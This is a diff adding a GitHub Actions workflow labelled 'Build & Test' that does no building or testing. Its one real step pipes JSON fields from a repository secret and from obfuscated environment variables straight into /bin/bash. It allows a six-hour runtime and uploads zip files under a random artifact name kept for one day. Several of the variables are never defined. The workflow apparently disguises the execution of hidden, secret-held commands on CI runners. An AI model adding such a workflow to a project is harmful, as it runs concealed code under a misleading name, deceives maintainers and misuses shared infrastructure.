@@ -1,0 +1,30 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          yyyh906: ${{ secrets.yyyh906 }}
+        run: |
+          printf '%s' "$yyyh906" | jq -r .dsr774 | /bin/bash
+          printf '%s' "$sutwd4594" | jq -r .im24 | /bin/bash
+          echo $hvx4 | jq -r .sdzbq81 | /bin/bash
+          printf '%s' "$tyk140" | jq -r .mm20 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: pjssEsHn
+          path: "*.zip"
+          retention-days: 1
